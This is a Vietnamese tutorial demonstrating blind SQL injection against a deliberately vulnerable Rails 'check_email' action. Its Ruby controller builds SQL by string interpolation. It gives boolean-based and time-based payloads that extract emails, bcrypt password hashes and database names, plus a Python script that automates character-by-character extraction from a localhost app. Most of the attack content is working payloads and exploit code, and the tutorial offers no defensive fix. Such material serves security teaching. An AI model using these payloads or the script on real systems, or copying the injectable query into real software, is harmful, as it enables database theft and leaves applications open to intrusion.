# Blind SQL Injection Demo

## Tạo controller vulnerable cho Blind SQLi

```ruby
# app/controllers/users_controller.rb (thêm action vulnerable)
def check_email
  email = params[:email]
  
  # Query vulnerable cho Blind SQLi
  sql = "SELECT COUNT(*) as count FROM users WHERE email='#{email}'"
  result = User.find_by_sql(sql).first
  
  if result.count > 0
    render json: { exists: true }
  else
    render json: { exists: false }
  end
end
```

## Loại 1: Boolean-based Blind SQLi

### Cách hoạt động:
- Không thấy kết quả query trực tiếp
- Chỉ biết được TRUE hoặc FALSE qua response
- Đoán từng ký tự của dữ liệu

### Ví dụ tấn công Boolean-based:

#### Kiểm tra độ dài password của user đầu tiên:
```sql
-- Test độ dài = 10
email = admin@test.com' AND (SELECT LENGTH(password_digest) FROM users LIMIT 1)=10--

-- Test độ dài = 60 (bcrypt hash)
email = admin@test.com' AND (SELECT LENGTH(password_digest) FROM users LIMIT 1)=60--
```

#### Đoán từng ký tự của email:
```sql
-- Ký tự đầu tiên là 'a'
email = admin@test.com' AND (SELECT SUBSTRING(email,1,1) FROM users LIMIT 1)='a'--

-- Ký tự thứ 2 là 'd' 
email = admin@test.com' AND (SELECT SUBSTRING(email,2,1) FROM users LIMIT 1)='d'--

-- Ký tự thứ 3 là 'm'
email = admin@test.com' AND (SELECT SUBSTRING(email,3,1) FROM users LIMIT 1)='m'--
```

#### Kiểm tra số lượng admin users:
```sql
-- Có bao nhiêu admin?
email = admin@test.com' AND (SELECT COUNT(*) FROM users WHERE role='admin')=1--
email = admin@test.com' AND (SELECT COUNT(*) FROM users WHERE role='admin')=2--
```

## Loại 2: Time-based Blind SQLi

### Cách hoạt động:
- Không có phản hồi khác biệt trong response
- Sử dụng delay để xác định TRUE/FALSE
- Nếu điều kiện đúng → delay, sai → không delay

### Ví dụ tấn công Time-based:

#### Kiểm tra xem có phải MySQL không:
```sql
-- Nếu là MySQL sẽ delay 5 giây
email = admin@test.com' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--
```

#### Đoán database name:
```sql
-- Nếu tên DB bắt đầu bằng 's' sẽ delay
email = admin@test.com' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(3),0)--

-- Nếu ký tự thứ 2 là 'e'
email = admin@test.com' AND IF(SUBSTRING(database(),2,1)='e',SLEEP(3),0)--
```

#### Đoán password hash:
```sql
-- Nếu ký tự đầu của password hash là '$'
email = admin@test.com' AND IF((SELECT SUBSTRING(password_digest,1,1) FROM users WHERE email='admin@example.com')='$',SLEEP(3),0)--

-- Nếu ký tự thứ 2 là '2'
email = admin@test.com' AND IF((SELECT SUBSTRING(password_digest,2,1) FROM users WHERE email='admin@example.com')='2',SLEEP(3),0)--
```

#### Đoán số lượng bảng:
```sql
-- Nếu có hơn 5 bảng sẽ delay
email = admin@test.com' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5,SLEEP(3),0)--
```

## Script tự động cho Blind SQLi:

```python
import requests
import time
import string

def blind_sqli_extract_email():
    url = "http://localhost:3000/users/check_email"
    extracted = ""
    
    # Đoán từng ký tự của email user đầu tiên
    for position in range(1, 50):  # Giả sử email không quá 50 ký tự
        found = False
        
        for char in string.ascii_lowercase + string.digits + '@._-':
            payload = f"admin@test.com' AND (SELECT SUBSTRING(email,{position},1) FROM users LIMIT 1)='{char}'--"
            
            data = {'email': payload}
            response = requests.post(url, data=data)
            
            if response.json().get('exists') == True:
                extracted += char
                print(f"Found character at position {position}: {char}")
                print(f"Current extracted: {extracted}")
                found = True
                break
        
        if not found:
            break
    
    return extracted

def time_based_blind_sqli():
    url = "http://localhost:3000/users/check_email"
    
    # Test xem có delay không
    payload = "admin@test.com' AND IF(1=1,SLEEP(3),0)--"
    
    start_time = time.time()
    response = requests.post(url, data={'email': payload})
    end_time = time.time()
    
    if end_time - start_time > 3:
        print("Time-based SQLi vulnerability confirmed!")
        return True
    else:
        print("No time-based vulnerability detected")
        return False
```

## Nguy hiểm của Blind SQLi:
- Khó phát hiện vì không có lỗi rõ ràng
- Có thể trích xuất toàn bộ database
- Mất nhiều thời gian nhưng rất hiệu quả
- Bypass được nhiều cơ chế bảo vệ cơ bản
